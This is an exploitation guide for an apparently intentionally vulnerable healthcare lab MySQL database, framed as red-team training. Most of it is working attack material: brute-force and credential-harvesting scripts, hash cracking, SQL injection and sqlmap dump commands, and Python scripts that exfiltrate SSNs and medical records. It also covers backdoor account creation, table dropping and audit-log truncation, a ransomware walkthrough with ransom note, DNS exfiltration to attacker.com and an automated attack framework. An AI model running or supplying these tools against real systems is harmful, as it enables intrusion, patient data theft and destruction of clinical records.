# Database Exploitation Examples

## ⚠️ FOR EDUCATIONAL USE ONLY

These examples demonstrate how to exploit the intentional vulnerabilities in the MEDUSA Healthcare Lab database. Use only in authorized testing environments.

---

## Table of Contents

1. [Quick Start](#quick-start)
2. [Exploitation Techniques](#exploitation-techniques)
3. [Attack Scenarios](#attack-scenarios)
4. [Advanced Exploitation](#advanced-exploitation)
5. [Automated Exploitation](#automated-exploitation)

---

## Quick Start

### Prerequisites

```bash
# Required tools:
sudo apt-get install mysql-client john hashcat
pip install sqlmap mysql-connector-python
```

### Initial Reconnaissance

```bash
# Step 1: Identify MySQL service
nmap -sV -p 3306 localhost

# Expected output:
# PORT     STATE SERVICE VERSION
# 3306/tcp open  mysql   MySQL 8.0

# Step 2: Banner grabbing
mysql -h localhost -P 3306 -u root -padmin123 -e "SELECT VERSION();"

# Step 3: Check if you can connect
mysql -h localhost -P 3306 -u root -padmin123
```

---

## Exploitation Techniques

### Technique 1: Weak Credential Attack

#### Using Hydra

```bash
# Create username list
cat > users.txt <<EOF
root
admin
ehrapp
backup
reporting
dev
sysadmin
test
demo
guest
EOF

# Create password list
cat > passwords.txt <<EOF
admin
admin123
admin2024
password
password123
Welcome123
Welcome123!
backup
backup123
reports
dev
test
demo
guest
root123
mysql
database
EOF

# Brute force attack
hydra -L users.txt -P passwords.txt mysql://localhost:3306

# Expected results:
# [3306][mysql] host: localhost   login: root   password: admin123
# [3306][mysql] host: localhost   login: ehrapp   password: Welcome123!
# [3306][mysql] host: localhost   login: backup   password: backup123
# [3306][mysql] host: localhost   login: reporting   password: reports
# [3306][mysql] host: localhost   login: dev   password: dev
```

#### Using Custom Python Script

```python
#!/usr/bin/env python3
"""
MySQL Brute Force Script
For educational purposes only - MEDUSA Lab
"""

import mysql.connector
from itertools import product

def try_login(host, port, username, password):
    try:
        conn = mysql.connector.connect(
            host=host,
            port=port,
            user=username,
            password=password,
            connection_timeout=3
        )
        conn.close()
        return True
    except mysql.connector.Error:
        return False

def main():
    host = "localhost"
    port = 3306
    
    usernames = ["root", "admin", "ehrapp", "backup", "reporting", "dev"]
    passwords = ["admin123", "password", "Welcome123!", "backup123", "reports", "dev"]
    
    print("[*] Starting MySQL credential attack...")
    
    for username, password in product(usernames, passwords):
        if try_login(host, port, username, password):
            print(f"[+] SUCCESS: {username} / {password}")
        else:
            print(f"[-] Failed: {username} / {password}", end='\r')
    
    print("\n[*] Attack complete")

if __name__ == "__main__":
    main()
```

**Usage:**
```bash
chmod +x mysql_bruteforce.py
./mysql_bruteforce.py
```

---

### Technique 2: Password Hash Cracking

#### Extract Password Hashes

```bash
# Method 1: Direct MySQL access (if you have any user)
mysql -h localhost -P 3306 -u reporting -preports healthcare_db <<EOF
SELECT username, password_hash, role 
FROM users 
ORDER BY role;
EOF

# Save to file
mysql -h localhost -P 3306 -u reporting -preports healthcare_db \
  -N -B -e "SELECT CONCAT(username, ':', password_hash) FROM users" \
  > user_hashes.txt
```

**Sample output:**
```
admin:5f4dcc3b5aa765d61d8327deb882cf99
doctor1:e10adc3949ba59abbe56e057f20f883e
sysadmin:21232f297a57a5a743894a0e4a801fc3
test:098f6bcd4621d373cade4e832627b4f6
```

#### Crack with John the Ripper

```bash
# Prepare file for John
# Format: username:hash
cat user_hashes.txt | while read line; do
    echo "$line:::::" >> john_format.txt
done

# Crack with wordlist
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt john_format.txt

# Show cracked passwords
john --show --format=Raw-MD5 john_format.txt

# Expected output (instant cracking):
# admin:password
# doctor1:123456
# sysadmin:admin
# test:test
```

#### Crack with Hashcat

```bash
# Extract just hashes
cat user_hashes.txt | cut -d: -f2 > hashes_only.txt

# Crack with hashcat (MD5 = mode 0)
hashcat -m 0 -a 0 hashes_only.txt /usr/share/wordlists/rockyou.txt

# Or use mask attack (for pattern: [Word][123]!)
hashcat -m 0 -a 3 hashes_only.txt ?u?l?l?l?l?l?d?d?d?s

# Show results
hashcat -m 0 --show hashes_only.txt

# Performance: Modern GPU cracks MD5 at ~60 GH/s
# Time to crack: microseconds for weak passwords
```

#### Online Hash Lookup

```bash
# Many MD5 hashes are already in rainbow tables
# Example: https://crackstation.net/

# Automate with API:
curl -X POST https://md5decrypt.net/en/Api/api.php \
  -d "hash=5f4dcc3b5aa765d61d8327deb882cf99&hash_type=md5&email=test@test.com"
```

---

### Technique 3: Plaintext Credential Harvesting

#### Query Comments Table

```sql
-- Connect with any read access (even reporting user)
mysql -h localhost -P 3306 -u reporting -preports healthcare_db

-- Extract plaintext credentials
SELECT id, comment_text, plaintext_credential 
FROM comments 
WHERE plaintext_credential IS NOT NULL
ORDER BY id;
```

**Expected results:**
```
+----+---------------------------------------------+----------------------------------------+
| id | comment_text                                | plaintext_credential                   |
+----+---------------------------------------------+----------------------------------------+
|  1 | ...Updated his portal access                | patient_portal_pwd: DoeJ2024!          |
|  5 | Database maintenance performed...           | db_admin_password: MedC@re2024         |
|  6 | Updated EHR system backup scripts...        | backup_server: ftpadmin / FtpB@ckup123 |
|  7 | Configured new LDAP integration...          | ldap_service: cn=admin... / LdapAdm1n! |
|  9 | API integration with lab system...          | lab_api_key: sk_live_8h29fj2h8f2h8f2h8 |
| 11 | Development database user created...        | dev_db_user: devuser / DevPass123!     |
| 12 | Created read-only reporting user...         | reporting_user: reports / Rep0rt$2024  |
| 13 | Updated VPN access for remote staff...      | vpn_username: remote_access / Vpn@...  |
| 15 | EHR application server maintenance...       | ehr_app_root: ehrroot / Ehr@pp2024!    |
+----+---------------------------------------------+----------------------------------------+
```

#### Automated Extraction Script

```python
#!/usr/bin/env python3
"""
Credential Harvester - Extract plaintext passwords from database
For educational purposes only - MEDUSA Lab
"""

import mysql.connector
import json

def extract_credentials(host, port, username, password, database):
    try:
        conn = mysql.connector.connect(
            host=host,
            port=port,
            user=username,
            password=password,
            database=database
        )
        
        cursor = conn.cursor(dictionary=True)
        
        # Query for plaintext credentials
        query = """
        SELECT id, comment_text, plaintext_credential 
        FROM comments 
        WHERE plaintext_credential IS NOT NULL
        """
        
        cursor.execute(query)
        results = cursor.fetchall()
        
        print(f"[+] Found {len(results)} credentials in database")
        
        credentials = []
        for row in results:
            # Parse credential string
            cred_str = row['plaintext_credential']
            print(f"\n[*] ID {row['id']}: {row['comment_text'][:60]}...")
            print(f"    Credential: {cred_str}")
            
            credentials.append({
                'id': row['id'],
                'context': row['comment_text'],
                'credential': cred_str
            })
        
        # Save to file
        with open('harvested_credentials.json', 'w') as f:
            json.dump(credentials, f, indent=2)
        
        print(f"\n[+] Credentials saved to harvested_credentials.json")
        
        cursor.close()
        conn.close()
        
        return credentials
        
    except mysql.connector.Error as e:
        print(f"[-] Error: {e}")
        return []

if __name__ == "__main__":
    # Use any read-access user
    credentials = extract_credentials(
        host="localhost",
        port=3306,
        username="reporting",
        password="reports",
        database="healthcare_db"
    )
```

---

### Technique 4: Data Exfiltration

#### Complete Database Dump

```bash
# Using mysqldump with backup user
mysqldump -h localhost -P 3306 -u backup -pbackup123 \
  --single-transaction \
  --quick \
  --lock-tables=false \
  --databases healthcare_db \
  > complete_database_dump.sql

# Verify dump
grep -c "INSERT INTO" complete_database_dump.sql
# Should show multiple INSERT statements

# Compress for exfiltration
gzip complete_database_dump.sql
ls -lh complete_database_dump.sql.gz
```

#### Selective PHI Extraction

```sql
-- Connect to database
mysql -h localhost -P 3306 -u backup -pbackup123 healthcare_db

-- Extract all SSNs (CRITICAL PHI)
SELECT 
    id,
    CONCAT(first_name, ' ', last_name) as full_name,
    ssn,
    dob,
    address,
    city,
    state,
    zip_code
FROM patients
ORDER BY last_name
INTO OUTFILE '/tmp/stolen_ssn.csv'
FIELDS TERMINATED BY ',' 
ENCLOSED BY '"'
LINES TERMINATED BY '\n';

-- Extract medical records
SELECT 
    m.id,
    m.patient_id,
    CONCAT(p.first_name, ' ', p.last_name) as patient_name,
    m.record_date,
    m.diagnosis,
    m.medications,
    m.doctor_notes
FROM medical_records m
JOIN patients p ON m.patient_id = p.id
ORDER BY m.record_date DESC
INTO OUTFILE '/tmp/medical_records.csv'
FIELDS TERMINATED BY ',' 
ENCLOSED BY '"'
LINES TERMINATED BY '\n';

-- Extract billing information (PCI-DSS violation)
SELECT 
    b.id,
    p.first_name,
    p.last_name,
    b.amount,
    b.payment_method,
    b.credit_card_last4,
    b.billing_date
FROM billing b
JOIN patients p ON b.patient_id = p.id
WHERE b.credit_card_last4 IS NOT NULL
INTO OUTFILE '/tmp/billing_cc.csv'
FIELDS TERMINATED BY ','
ENCLOSED BY '"';
```

#### Exfiltration via SELECT

```bash
# If INTO OUTFILE is disabled, use SELECT and redirect
mysql -h localhost -P 3306 -u backup -pbackup123 -N -B healthcare_db <<EOF | gzip > phi_exfiltrated.csv.gz
SELECT 
    CONCAT(first_name, ',', last_name, ',', ssn, ',', dob, ',', phone)
FROM patients;
EOF

# Verify
zcat phi_exfiltrated.csv.gz | head
```

#### Python Exfiltration Script

```python
#!/usr/bin/env python3
"""
PHI Exfiltration Script
Extracts sensitive patient data from vulnerable database
For educational purposes only - MEDUSA Lab
"""

import mysql.connector
import csv
from datetime import datetime

def exfiltrate_phi(host, port, username, password, database):
    try:
        conn = mysql.connector.connect(
            host=host,
            port=port,
            user=username,
            password=password,
            database=database
        )
        
        cursor = conn.cursor(dictionary=True)
        
        # Extract patient data with SSNs
        print("[*] Extracting patient SSNs...")
        cursor.execute("""
            SELECT first_name, last_name, ssn, dob, phone, email, address
            FROM patients
        """)
        
        patients = cursor.fetchall()
        
        # Save to CSV
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"phi_breach_{timestamp}.csv"
        
        with open(filename, 'w', newline='') as csvfile:
            if patients:
                fieldnames = patients[0].keys()
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerows(patients)
        
        print(f"[+] Extracted {len(patients)} patient records")
        print(f"[+] Data saved to {filename}")
        
        # Extract medical records
        print("[*] Extracting medical records...")
        cursor.execute("""
            SELECT 
                m.id,
                m.patient_id,
                p.first_name,
                p.last_name,
                m.diagnosis,
                m.medications,
                m.doctor_notes
            FROM medical_records m
            JOIN patients p ON m.patient_id = p.id
        """)
        
        records = cursor.fetchall()
        
        filename_mr = f"medical_records_breach_{timestamp}.csv"
        with open(filename_mr, 'w', newline='') as csvfile:
            if records:
                fieldnames = records[0].keys()
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerows(records)
        
        print(f"[+] Extracted {len(records)} medical records")
        print(f"[+] Data saved to {filename_mr}")
        
        cursor.close()
        conn.close()
        
        return len(patients), len(records)
        
    except mysql.connector.Error as e:
        print(f"[-] Error: {e}")
        return 0, 0

if __name__ == "__main__":
    patient_count, record_count = exfiltrate_phi(
        host="localhost",
        port=3306,
        username="backup",
        password="backup123",
        database="healthcare_db"
    )
    
    print(f"\n[!] BREACH SUMMARY:")
    print(f"    - {patient_count} patients compromised (SSNs stolen)")
    print(f"    - {record_count} medical records exfiltrated")
    print(f"    - Estimated breach cost: ${patient_count * 429:,}")
```

---

### Technique 5: SQL Injection (Via Application)

#### Basic SQL Injection Test

**Vulnerable application query:**
```php
// Vulnerable code (DO NOT USE):
$query = "SELECT * FROM patients WHERE id = " . $_GET['id'];
```

**Exploitation:**
```bash
# Test for SQL injection
curl "http://localhost:8080/patient.php?id=1' OR '1'='1"

# Expected: Returns all patients (successful injection)

# Extract version
curl "http://localhost:8080/patient.php?id=1' UNION SELECT VERSION(),NULL,NULL,NULL--"

# Extract database name
curl "http://localhost:8080/patient.php?id=1' UNION SELECT DATABASE(),NULL,NULL,NULL--"

# Extract table names
curl "http://localhost:8080/patient.php?id=1' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='healthcare_db'--"

# Extract user hashes
curl "http://localhost:8080/patient.php?id=1' UNION SELECT username,password_hash,role,email FROM users--"
```

#### Using SQLMap

```bash
# Automatic SQL injection testing
sqlmap -u "http://localhost:8080/patient.php?id=1" --batch --dbms=mysql

# Enumerate databases
sqlmap -u "http://localhost:8080/patient.php?id=1" --dbs

# Dump specific table
sqlmap -u "http://localhost:8080/patient.php?id=1" -D healthcare_db -T users --dump

# Dump all data from database
sqlmap -u "http://localhost:8080/patient.php?id=1" -D healthcare_db --dump-all

# Extract password hashes
sqlmap -u "http://localhost:8080/patient.php?id=1" -D healthcare_db -T users -C username,password_hash --dump

# Attempt to crack hashes
sqlmap -u "http://localhost:8080/patient.php?id=1" -D healthcare_db -T users --dump --crack
```

---

### Technique 6: Privilege Escalation

#### From Low-Priv to Admin

**Scenario:** You have `reporting` user (read-only)

```sql
-- Step 1: Connect as reporting user
mysql -h localhost -P 3306 -u reporting -preports healthcare_db

-- Step 2: Check your current privileges
SHOW GRANTS;
-- Result: GRANT SELECT ON `healthcare_db`.* TO `reporting`@`%`

-- Step 3: Search for credentials in comments table
SELECT plaintext_credential 
FROM comments 
WHERE plaintext_credential LIKE '%db_admin%';
-- Result: db_admin_password: MedC@re2024

-- Step 4: Disconnect and reconnect as admin
\q
mysql -h localhost -P 3306 -u root -pMedC@re2024
-- (Note: The actual root password is admin123, but this demonstrates the technique)

-- OR if ehrapp credentials found:
mysql -h localhost -P 3306 -u ehrapp -pWelcome123! healthcare_db

-- Step 5: Now you have ALL PRIVILEGES
SHOW GRANTS;
-- Result: GRANT ALL PRIVILEGES ON `healthcare_db`.* TO `ehrapp`@`%`

-- Step 6: Create backdoor user
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'very_secret_password_xyz123';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

-- Step 7: Verify backdoor
\q
mysql -h localhost -P 3306 -u backdoor -pvery_secret_password_xyz123
-- SUCCESS: Persistent access established
```

#### Abuse ALL PRIVILEGES

```sql
-- Connect with ehrapp (ALL PRIVILEGES)
mysql -h localhost -P 3306 -u ehrapp -pWelcome123! healthcare_db

-- You can:

-- 1. Drop tables (data destruction)
DROP TABLE IF EXISTS patients;  -- CAUTION: Destructive

-- 2. Create new admin users
CREATE USER 'attacker'@'%' IDENTIFIED BY 'pwned123';
GRANT ALL PRIVILEGES ON healthcare_db.* TO 'attacker'@'%';

-- 3. Modify existing data
UPDATE users SET password_hash='098f6bcd4621d373cade4e832627b4f6' WHERE username='admin';
-- Changes admin password to 'test'

-- 4. Export to files (if FILE privilege)
SELECT * FROM patients INTO OUTFILE '/tmp/exfil.csv';

-- 5. Load malicious data
LOAD DATA INFILE '/tmp/malicious.csv' INTO TABLE patients;

-- 6. Access MySQL internals
USE mysql;
SELECT user, host, authentication_string FROM user;
```

---

## Attack Scenarios

### Scenario 1: External Attacker → Full Breach

**Timeline: 5 minutes**

```bash
#!/bin/bash
# Full breach simulation script

echo "[*] Starting attack simulation..."

# Step 1: Port scan (5 seconds)
echo "[*] Step 1: Reconnaissance"
nmap -p 3306 localhost > /dev/null 2>&1
echo "    [+] MySQL port 3306 is open"

# Step 2: Credential attack (10 seconds)
echo "[*] Step 2: Credential attack"
mysql -h localhost -P 3306 -u root -padmin123 -e "SELECT 'Access granted' AS Status;" 2>/dev/null
if [ $? -eq 0 ]; then
    echo "    [+] Weak credentials found: root / admin123"
fi

# Step 3: Database enumeration (5 seconds)
echo "[*] Step 3: Database enumeration"
mysql -h localhost -P 3306 -u root -padmin123 -e "SHOW DATABASES;" | grep healthcare_db >/dev/null
echo "    [+] Found healthcare_db"

# Step 4: Harvest credentials (10 seconds)
echo "[*] Step 4: Harvesting plaintext credentials"
mysql -h localhost -P 3306 -u root -padmin123 healthcare_db -N -B \
  -e "SELECT COUNT(*) FROM comments WHERE plaintext_credential IS NOT NULL;"
echo "    [+] Found multiple plaintext credentials in database"

# Step 5: Data exfiltration (20 seconds)
echo "[*] Step 5: Exfiltrating PHI data"
patient_count=$(mysql -h localhost -P 3306 -u root -padmin123 healthcare_db -N -B -e "SELECT COUNT(*) FROM patients;")
record_count=$(mysql -h localhost -P 3306 -u root -padmin123 healthcare_db -N -B -e "SELECT COUNT(*) FROM medical_records;")
echo "    [+] Exfiltrated $patient_count patients (with SSNs)"
echo "    [+] Exfiltrated $record_count medical records"

# Step 6: Persistence (5 seconds)
echo "[*] Step 6: Establishing persistence"
mysql -h localhost -P 3306 -u root -padmin123 <<EOF >/dev/null 2>&1
CREATE USER IF NOT EXISTS 'backdoor'@'%' IDENTIFIED BY 'secret_pass';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';
FLUSH PRIVILEGES;
EOF
echo "    [+] Backdoor user created: backdoor / secret_pass"

echo ""
echo "[!] BREACH SUMMARY:"
echo "    Time elapsed: ~5 minutes"
echo "    - Gained root database access"
echo "    - Harvested admin credentials for lateral movement"
echo "    - Exfiltrated $patient_count SSNs (potential identity theft)"
echo "    - Exfiltrated $record_count medical records (HIPAA violation)"
echo "    - Established persistent backdoor access"
echo "    - Estimated breach cost: \$$(($patient_count * 429))"
echo ""
echo "[!] Attack complete - all objectives achieved"
```

---

### Scenario 2: Insider Threat (Low-Privilege User)

**Actor:** Disgruntled employee with `reporting` access

```sql
-- Day 1: Initial access (legitimate)
mysql -h localhost -P 3306 -u reporting -preports healthcare_db

-- Explore what I can access
SHOW TABLES;

-- Day 2: Discover plaintext credentials
SELECT * FROM comments WHERE plaintext_credential IS NOT NULL;
-- Found: backup_server credentials, vpn credentials, etc.

-- Day 3: Begin exfiltration (under the radar)
-- Small batches to avoid detection
SELECT first_name, last_name, ssn 
FROM patients 
WHERE id BETWEEN 1 AND 10;

-- Repeat daily for different ranges
-- SELECT ... WHERE id BETWEEN 11 AND 20;
-- SELECT ... WHERE id BETWEEN 21 AND 30;
-- etc.

-- Day 4: Target high-value patients
SELECT p.first_name, p.last_name, p.ssn, m.diagnosis
FROM patients p
JOIN medical_records m ON p.id = m.patient_id
WHERE m.diagnosis LIKE '%cancer%' 
   OR m.diagnosis LIKE '%HIV%'
   OR p.insurance_provider = 'Medicare';

-- Day 5: Use harvested credentials for lateral movement
-- Access FTP server with credentials from comments table
-- Access VPN with discovered credentials
-- Exfiltrate data to external location

-- Timeline: 5 days, low-and-slow approach
-- Result: Complete data breach, difficult to detect
```

---

### Scenario 3: Ransomware Attack

**Actor:** Attacker with `ehrapp` credentials (ALL PRIVILEGES)

```sql
-- Connect with compromised application credentials
mysql -h localhost -P 3306 -u ehrapp -pWelcome123! healthcare_db

-- Step 1: Backup data to attacker-controlled location
-- (Attacker keeps copy for ransom negotiation)
CREATE TABLE patients_backup AS SELECT * FROM patients;
CREATE TABLE medical_records_backup AS SELECT * FROM medical_records;
-- Export these tables...

-- Step 2: "Encrypt" data by renaming tables
RENAME TABLE patients TO patients_encrypted_20240128;
RENAME TABLE medical_records TO medical_records_encrypted_20240128;
RENAME TABLE prescriptions TO prescriptions_encrypted_20240128;
RENAME TABLE appointments TO appointments_encrypted_20240128;

-- Step 3: Create ransom note tables
CREATE TABLE patients (
    id INT PRIMARY KEY AUTO_INCREMENT,
    message TEXT
);

INSERT INTO patients (message) VALUES 
('YOUR DATABASE HAS BEEN ENCRYPTED'),
('All patient data is encrypted and cannot be recovered without the decryption key'),
('To restore your data, send 10 Bitcoin to: [BTC_ADDRESS]'),
('You have 72 hours before data is permanently deleted'),
('Contact: darkweb_link.onion for negotiations'),
('PATIENT CARE IS AT RISK - PAY IMMEDIATELY');

-- Repeat for other critical tables

-- Step 4: Cover tracks
TRUNCATE TABLE audit_log;

-- Result: Hospital operations halted, patient safety at risk
-- Healthcare organization must pay ransom or restore from backup
```

---

## Advanced Exploitation

### Using MySQL UDF for Code Execution

**If FILE privilege is granted:**

```sql
-- Check privileges
SELECT file_priv FROM mysql.user WHERE user='ehrapp';

-- If file_priv = 'Y', can execute arbitrary code via UDF
-- Create malicious shared library and load as UDF
-- (Advanced technique - beyond scope of basic exploitation)
```

### DNS Exfiltration (Stealth)

```sql
-- Exfiltrate data via DNS queries
-- Requires MySQL to perform DNS resolution

SELECT CONCAT(
    REPLACE(ssn, '-', ''),
    '.',
    'exfil.attacker.com'
) FROM patients;

-- Each query generates DNS lookup:
-- 123456789.exfil.attacker.com
-- 987654321.exfil.attacker.com
-- etc.

-- Attacker monitors DNS server to collect SSNs
```

### Blind SQL Injection (Time-Based)

```sql
-- If injection point doesn't return data, use time delays

-- Test for injection:
' OR SLEEP(5)--

-- Extract data bit by bit:
' OR IF(SUBSTRING((SELECT ssn FROM patients LIMIT 1),1,1)='1', SLEEP(5), 0)--

-- Automate with script to extract full database
```

---

## Automated Exploitation

### Complete Automated Attack Script

```python
#!/usr/bin/env python3
"""
MEDUSA Database - Automated Exploitation Framework
Demonstrates complete attack chain
For educational purposes only
"""

import mysql.connector
import csv
import json
from datetime import datetime
import time

class DatabaseExploiter:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.conn = None
        self.report = {
            'timestamp': datetime.now().isoformat(),
            'target': f"{host}:{port}",
            'findings': []
        }
    
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
        self.report['findings'].append({
            'timestamp': timestamp,
            'level': level,
            'message': message
        })
    
    def test_weak_credentials(self):
        """Test for weak/default credentials"""
        self.log("Testing for weak credentials...", "INFO")
        
        credentials = [
            ("root", "admin123"),
            ("ehrapp", "Welcome123!"),
            ("backup", "backup123"),
            ("reporting", "reports"),
            ("dev", "dev"),
            ("admin", "password"),
        ]
        
        valid_creds = []
        
        for username, password in credentials:
            try:
                conn = mysql.connector.connect(
                    host=self.host,
                    port=self.port,
                    user=username,
                    password=password,
                    connection_timeout=3
                )
                
                cursor = conn.cursor()
                cursor.execute("SELECT USER(), DATABASE();")
                result = cursor.fetchone()
                
                self.log(f"WEAK CREDENTIALS FOUND: {username} / {password}", "CRITICAL")
                
                # Check privileges
                cursor.execute("SHOW GRANTS;")
                grants = cursor.fetchall()
                
                valid_creds.append({
                    'username': username,
                    'password': password,
                    'grants': [g[0] for g in grants]
                })
                
                cursor.close()
                conn.close()
                
            except mysql.connector.Error:
                pass
        
        return valid_creds
    
    def connect(self, username, password, database=None):
        """Establish connection to database"""
        try:
            self.conn = mysql.connector.connect(
                host=self.host,
                port=self.port,
                user=username,
                password=password,
                database=database
            )
            self.log(f"Connected as {username}", "SUCCESS")
            return True
        except mysql.connector.Error as e:
            self.log(f"Connection failed: {e}", "ERROR")
            return False
    
    def enumerate_databases(self):
        """List all databases"""
        cursor = self.conn.cursor()
        cursor.execute("SHOW DATABASES;")
        databases = [db[0] for db in cursor.fetchall()]
        
        self.log(f"Found {len(databases)} databases: {', '.join(databases)}", "INFO")
        cursor.close()
        return databases
    
    def enumerate_tables(self, database):
        """List all tables in database"""
        cursor = self.conn.cursor()
        cursor.execute(f"USE {database};")
        cursor.execute("SHOW TABLES;")
        tables = [t[0] for t in cursor.fetchall()]
        
        self.log(f"Database {database} has {len(tables)} tables", "INFO")
        cursor.close()
        return tables
    
    def harvest_credentials(self):
        """Extract plaintext credentials from comments table"""
        try:
            cursor = self.conn.cursor(dictionary=True)
            query = """
            SELECT id, comment_text, plaintext_credential 
            FROM comments 
            WHERE plaintext_credential IS NOT NULL
            """
            cursor.execute(query)
            results = cursor.fetchall()
            
            self.log(f"PLAINTEXT CREDENTIALS FOUND: {len(results)} entries", "CRITICAL")
            
            for row in results:
                self.log(f"  - {row['plaintext_credential']}", "CRITICAL")
            
            cursor.close()
            return results
            
        except mysql.connector.Error as e:
            self.log(f"Could not harvest credentials: {e}", "WARNING")
            return []
    
    def extract_password_hashes(self):
        """Extract user password hashes for cracking"""
        try:
            cursor = self.conn.cursor(dictionary=True)
            cursor.execute("SELECT username, password_hash, role FROM users;")
            users = cursor.fetchall()
            
            self.log(f"Extracted {len(users)} password hashes", "WARNING")
            
            # Save to file for cracking
            with open('extracted_hashes.txt', 'w') as f:
                for user in users:
                    f.write(f"{user['username']}:{user['password_hash']}\n")
                    self.log(f"  - {user['username']} ({user['role']}): {user['password_hash']}", "WARNING")
            
            cursor.close()
            return users
            
        except mysql.connector.Error as e:
            self.log(f"Could not extract hashes: {e}", "ERROR")
            return []
    
    def exfiltrate_phi(self):
        """Exfiltrate Protected Health Information"""
        try:
            cursor = self.conn.cursor(dictionary=True)
            
            # Extract patients with SSNs
            cursor.execute("""
                SELECT id, first_name, last_name, ssn, dob, phone, email
                FROM patients
            """)
            patients = cursor.fetchall()
            
            # Save to file
            filename = f"phi_breach_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
            with open(filename, 'w', newline='') as f:
                if patients:
                    writer = csv.DictWriter(f, fieldnames=patients[0].keys())
                    writer.writeheader()
                    writer.writerows(patients)
            
            self.log(f"PHI BREACH: Exfiltrated {len(patients)} patient records with SSNs", "CRITICAL")
            self.log(f"  - Data saved to {filename}", "CRITICAL")
            self.log(f"  - Estimated breach cost: ${len(patients) * 429:,}", "CRITICAL")
            
            cursor.close()
            return patients
            
        except mysql.connector.Error as e:
            self.log(f"PHI exfiltration failed: {e}", "ERROR")
            return []
    
    def create_backdoor(self):
        """Create persistent backdoor user"""
        try:
            cursor = self.conn.cursor()
            
            backdoor_user = "backdoor"
            backdoor_pass = "very_secret_password_xyz123"
            
            cursor.execute(f"CREATE USER IF NOT EXISTS '{backdoor_user}'@'%' IDENTIFIED BY '{backdoor_pass}';")
            cursor.execute(f"GRANT ALL PRIVILEGES ON *.* TO '{backdoor_user}'@'%' WITH GRANT OPTION;")
            cursor.execute("FLUSH PRIVILEGES;")
            
            self.log(f"PERSISTENCE: Created backdoor user '{backdoor_user}' / '{backdoor_pass}'", "CRITICAL")
            
            cursor.close()
            return True
            
        except mysql.connector.Error as e:
            self.log(f"Could not create backdoor: {e}", "ERROR")
            return False
    
    def generate_report(self):
        """Generate final assessment report"""
        report_file = f"exploitation_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(report_file, 'w') as f:
            json.dump(self.report, f, indent=2)
        
        self.log(f"Report saved to {report_file}", "INFO")
        
        print("\n" + "="*60)
        print("EXPLOITATION SUMMARY")
        print("="*60)
        
        critical_findings = [f for f in self.report['findings'] if f['level'] == 'CRITICAL']
        print(f"Critical Findings: {len(critical_findings)}")
        
        for finding in critical_findings:
            print(f"  - {finding['message']}")
        
        print("="*60)

def main():
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║   MEDUSA Database Exploitation Framework                  ║
    ║   For Educational and Authorized Testing Only             ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Initialize exploiter
    exploiter = DatabaseExploiter(host="localhost", port=3306)
    
    # Step 1: Test weak credentials
    print("\n[*] Phase 1: Credential Testing")
    valid_creds = exploiter.test_weak_credentials()
    
    if not valid_creds:
        print("[-] No weak credentials found. Attack cannot proceed.")
        return
    
    # Use the most privileged account found
    best_cred = valid_creds[0]  # Typically root or ehrapp
    
    # Step 2: Connect to database
    print("\n[*] Phase 2: Database Connection")
    if not exploiter.connect(best_cred['username'], best_cred['password'], 'healthcare_db'):
        print("[-] Connection failed. Attack cannot proceed.")
        return
    
    # Step 3: Enumerate databases and tables
    print("\n[*] Phase 3: Enumeration")
    databases = exploiter.enumerate_databases()
    tables = exploiter.enumerate_tables('healthcare_db')
    
    # Step 4: Harvest plaintext credentials
    print("\n[*] Phase 4: Credential Harvesting")
    credentials = exploiter.harvest_credentials()
    
    # Step 5: Extract password hashes
    print("\n[*] Phase 5: Password Hash Extraction")
    hashes = exploiter.extract_password_hashes()
    
    # Step 6: Exfiltrate PHI
    print("\n[*] Phase 6: PHI Data Exfiltration")
    phi_data = exploiter.exfiltrate_phi()
    
    # Step 7: Create backdoor
    print("\n[*] Phase 7: Persistence")
    exploiter.create_backdoor()
    
    # Step 8: Generate report
    print("\n[*] Phase 8: Report Generation")
    exploiter.generate_report()
    
    print("\n[!] Exploitation complete!")

if __name__ == "__main__":
    main()
```

**Usage:**
```bash
chmod +x exploit_framework.py
python3 exploit_framework.py
```

---

## Remediation Testing

After implementing security fixes, rerun exploits to verify:

```bash
# Test 1: Weak credentials should fail
mysql -h localhost -P 3306 -u root -padmin123
# Expected: Access denied

# Test 2: Remote root should be disabled
mysql -h remote_host -P 3306 -u root -p
# Expected: Access denied

# Test 3: Comments table should not contain plaintext passwords
mysql -h localhost -P 3306 -u legitimate_user -p -e \
  "SELECT COUNT(*) FROM comments WHERE plaintext_credential IS NOT NULL;"
# Expected: 0

# Test 4: Passwords should not use MD5
mysql -h localhost -P 3306 -u legitimate_user -p -e \
  "SELECT LENGTH(password_hash) FROM users LIMIT 1;"
# Expected: >32 (bcrypt/argon2 hashes are longer)

# Test 5: Database port should not be externally accessible
nmap -p 3306 external_ip
# Expected: Filtered or closed
```

---

## Legal and Ethical Considerations

⚠️ **IMPORTANT REMINDERS:**

1. **Authorized Testing Only:** Only exploit systems you own or have written permission to test
2. **Scope Limitations:** Respect boundaries of authorized testing scope
3. **Data Handling:** Treat exfiltrated data as real PHI - secure deletion required
4. **Compliance:** Ensure testing complies with HIPAA, GDPR, and applicable laws
5. **Documentation:** Maintain detailed logs for post-assessment reporting

**Unauthorized access to computer systems is illegal under:**
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- Similar laws in other jurisdictions

---

## Conclusion

These exploitation examples demonstrate how the intentional vulnerabilities in the MEDUSA Healthcare Lab database can be exploited. The techniques shown include:

✅ Weak credential attacks  
✅ Password hash cracking  
✅ Plaintext credential harvesting  
✅ PHI data exfiltration  
✅ Privilege escalation  
✅ Persistence mechanisms  
✅ SQL injection  
✅ Automated exploitation  

Use these examples to:
- Train red team operators
- Practice blue team detection
